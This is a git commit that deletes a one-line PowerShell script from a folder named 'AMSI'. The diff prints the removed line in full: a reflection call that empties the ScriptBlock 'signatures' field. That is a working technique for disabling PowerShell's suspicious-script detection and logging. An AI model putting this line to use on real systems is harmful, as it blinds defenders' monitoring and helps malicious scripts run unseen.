be107c91b15248b330f09de1e6120d50b73219fc
kyle <kyle41111@gmail.com>
2023-01-20 13:04:30 -0500

    Delete disScriptLog2.ps1

--- AMSI/disScriptLog2.ps1
+++
@@ -1,1 +0,0 @@
-[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
